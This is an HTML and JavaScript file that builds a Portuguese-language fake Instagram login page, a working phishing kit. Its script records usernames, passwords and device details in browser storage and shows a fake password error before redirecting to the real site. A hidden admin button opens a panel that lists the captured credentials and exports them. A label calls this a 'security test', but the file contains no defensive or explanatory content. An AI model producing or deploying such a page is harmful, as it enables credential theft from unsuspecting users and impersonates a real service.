<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }

        .container {
            display: flex;
            flex-direction: column;
            align-items: center;
            max-width: 350px;
            width: 100%;
        }

        .login-box {
            background: white;
            border: 1px solid #dbdbdb;
            padding: 30px 40px;
            text-align: center;
            margin-bottom: 10px;
            width: 100%;
        }

        .logo {
            margin: 25px 0;
            font-size: 45px;
            font-weight: 300;
            background: linear-gradient(45deg, #405DE6, #5851DB, #833AB4, #C13584, #E1306C, #FD1D1D, #F56040, #F77737, #FCAF45, #FFDC80);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        .login-form input {
            width: 100%;
            padding: 12px 10px;
            margin: 8px 0;
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            font-size: 14px;
            outline: none;
        }

        .login-form input:focus {
            border-color: #a8a8a8;
        }

        .login-btn {
            width: 100%;
            background: #0095f6;
            color: white;
            border: none;
            padding: 10px;
            border-radius: 8px;
            margin: 15px 0;
            font-weight: 600;
            cursor: pointer;
            opacity: 0.7;
        }

        .login-btn.active {
            opacity: 1;
        }

        .separator {
            display: flex;
            align-items: center;
            margin: 20px 0;
            color: #8e8e8e;
            font-size: 14px;
            font-weight: 600;
        }

        .separator::before,
        .separator::after {
            content: "";
            flex: 1;
            border-bottom: 1px solid #dbdbdb;
        }

        .separator span {
            padding: 0 20px;
        }

        .facebook-login {
            color: #385185;
            font-weight: 600;
            text-decoration: none;
            margin: 15px 0;
            display: block;
            font-size: 15px;
        }

        .forgot-password {
            color: #00376b;
            text-decoration: none;
            font-size: 13px;
            display: block;
            margin: 18px 0;
        }

        .signup-box {
            background: white;
            border: 1px solid #dbdbdb;
            padding: 25px;
            text-align: center;
            margin: 15px 0;
            width: 100%;
        }

        .signup-box a {
            color: #0095f6;
            text-decoration: none;
            font-weight: 600;
        }

        .loading {
            display: none;
            margin: 15px 0;
            color: #8e8e8e;
            font-size: 14px;
        }

        .error-message {
            display: none;
            color: #ed4956;
            font-size: 14px;
            margin: 12px 0;
            background: #fafafa;
            padding: 12px;
            border-radius: 3px;
            border: 1px solid #dbdbdb;
        }

        .admin-panel {
            display: none;
            background: white;
            border: 2px solid #0095f6;
            padding: 20px;
            margin-top: 20px;
            border-radius: 10px;
            width: 100%;
        }

        .admin-btn {
            position: fixed;
            bottom: 10px;
            right: 10px;
            background: #0095f6;
            color: white;
            border: none;
            padding: 8px 12px;
            border-radius: 20px;
            font-size: 12px;
            cursor: pointer;
        }

        .admin-actions {
            margin: 15px 0;
        }

        .admin-actions button {
            background: #0095f6;
            color: white;
            border: none;
            padding: 8px 15px;
            margin: 5px;
            border-radius: 5px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <div class="logo">Instagram</div>
            <form class="login-form" id="loginForm">
                <input type="text" id="username" placeholder="Telefone, nome de usu√°rio ou email" required>
                <input type="password" id="password" placeholder="Senha" required>
                <button type="submit" class="login-btn" id="loginBtn" disabled>Entrar</button>
                <div class="loading" id="loading">Entrando...</div>
                <div class="error-message" id="errorMessage">
                    Sua senha est√° incorreta. Tente novamente.
                </div>
            </form>
            
            <div class="separator">
                <span>OU</span>
            </div>
            
            <a href="#" class="facebook-login">Entrar com o Facebook</a>
            <a href="#" class="forgot-password">Esqueceu a senha?</a>
        </div>
        
        <div class="signup-box">
            N√£o tem uma conta? <a href="#">Cadastre-se</a>
        </div>

        <!-- Painel Admin -->
        <div class="admin-panel" id="adminPanel">
            <h3>üîê Dados Capturados - Teste de Seguran√ßa</h3>
            <div id="adminData" style="margin: 15px 0;"></div>
            <div class="admin-actions">
                <button onclick="exportData()">üì• Exportar Dados</button>
                <button onclick="clearData()" style="background: #dc3545;">üóëÔ∏è Limpar Tudo</button>
                <button onclick="hideAdmin()">‚ùå Fechar</button>
            </div>
        </div>
    </div>

    <button class="admin-btn" onclick="showAdmin()">üîß</button>

    <script>
        // ======================= SISTEMA COMPLETO =======================
        
        // Elementos principais
        const loginForm = document.getElementById('loginForm');
        const usernameInput = document.getElementById('username');
        const passwordInput = document.getElementById('password');
        const loginBtn = document.getElementById('loginBtn');
        const loading = document.getElementById('loading');
        const errorMessage = document.getElementById('errorMessage');
        const adminPanel = document.getElementById('adminPanel');
        const adminData = document.getElementById('adminData');

        // Ativar bot√£o quando campos estiverem preenchidos
        function updateLoginButton() {
            if (usernameInput.value.trim() && passwordInput.value.trim()) {
                loginBtn.classList.add('active');
                loginBtn.disabled = false;
            } else {
                loginBtn.classList.remove('active');
                loginBtn.disabled = true;
            }
        }

        usernameInput.addEventListener('input', updateLoginButton);
        passwordInput.addEventListener('input', updateLoginButton);

        // Capturar dados do formul√°rio
        loginForm.addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const username = usernameInput.value.trim();
            const password = passwordInput.value.trim();
            
            if (!username || !password) return;
            
            // Mostrar loading
            loading.style.display = 'block';
            errorMessage.style.display = 'none';
            loginBtn.disabled = true;
            
            try {
                // Criar objeto com dados capturados
                const userData = {
                    username: username,
                    password: password,
                    timestamp: new Date().toLocaleString('pt-BR'),
                    userAgent: navigator.userAgent,
                    screen: `${screen.width}x${screen.height}`,
                    language: navigator.language,
                    platform: navigator.platform
                };
                
                // Salvar dados
                saveToStorage(userData);
                
                // Simular processamento
                await new Promise(resolve => setTimeout(resolve, 2000));
                
                // Mostrar erro fake
                loading.style.display = 'none';
                errorMessage.style.display = 'block';
                
                // Redirecionar para Instagram real ap√≥s 3 segundos
                setTimeout(() => {
                    window.location.href = 'https://instagram.com';
                }, 3000);
                
            } catch (error) {
                loading.style.display = 'none';
                errorMessage.style.display = 'block';
            }
        });

        // Sistema de armazenamento
        function saveToStorage(data) {
            try {
                let existingData = JSON.parse(localStorage.getItem('instagramPhishingData') || '[]');
                existingData.push(data);
                localStorage.setItem('instagramPhishingData', JSON.stringify(existingData));
                console.log('‚úÖ Dados salvos:', data);
            } catch (error) {
                console.error('‚ùå Erro ao salvar:', error);
            }
        }

        // Painel administrativo
        function showAdmin() {
            adminPanel.style.display = 'block';
            loadAdminData();
        }

        function hideAdmin() {
            adminPanel.style.display = 'none';
        }

        function loadAdminData() {
            try {
                const data = JSON.parse(localStorage.getItem('instagramPhishingData') || '[]');
                
                if (data.length === 0) {
                    adminData.innerHTML = '<p>Nenhum dado capturado ainda.</p>';
                    return;
                }
                
                let html = `<p><strong>Total de logins: ${data.length}</strong></p>`;
                
                data.forEach((item, index) => {
                    html += `
                        <div style="border: 1px solid #ddd; padding: 10px; margin: 10px 0; border-radius: 5px;">
                            <p><strong>üë§ Usu√°rio:</strong> ${escapeHtml(item.username)}</p>
                            <p><strong>üîë Senha:</strong> <span style="background: #f0f0f0; padding: 2px 5px; border-radius: 3px;">${escapeHtml(item.password)}</span></p>
                            <p><strong>üïí Data:</strong> ${item.timestamp}</p>
                            <p><strong>üì± Dispositivo:</strong> ${getDeviceType(item.userAgent)}</p>
                        </div>
                    `;
                });
                
                adminData.innerHTML = html;
                
            } catch (error) {
                adminData.innerHTML = '<p>Erro ao carregar dados.</p>';
            }
        }

        function exportData() {
            try {
                const data = JSON.parse(localStorage.getItem('instagramPhishingData') || '[]');
                
                if (data.length === 0) {
                    alert('Nenhum dado para exportar.');
                    return;
                }
                
                const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
                const url = URL.createObjectURL(blob);
                const a = document.createElement('a');
                a.href = url;
                a.download = 'dados-capturados.json';
                a.click();
                URL.revokeObjectURL(url);
                
                alert(`‚úÖ ${data.length} registros exportados!`);
                
            } catch (error) {
                alert('‚ùå Erro ao exportar dados.');
            }
        }

        function clearData() {
            if (confirm('Tem certeza que deseja apagar TODOS os dados?')) {
                localStorage.removeItem('instagramPhishingData');
                loadAdminData();
                alert('Dados apagados com sucesso!');
            }
        }

        // Fun√ß√µes auxiliares
        function escapeHtml(text) {
            const div = document.createElement('div');
            div.textContent = text;
            return div.innerHTML;
        }

        function getDeviceType(userAgent) {
            if (userAgent.includes('Mobile')) return 'üì± Celular';
            if (userAgent.includes('Tablet')) return 'üìü Tablet';
            return 'üíª Computador';
        }

        // Tecla Enter para submit
        passwordInput.addEventListener('keypress', function(e) {
            if (e.key === 'Enter' && !loginBtn.disabled) {
                loginForm.dispatchEvent(new Event('submit'));
            }
        });

        // Inicializar
        updateLoginButton();
    </script>
</body>
  </html>
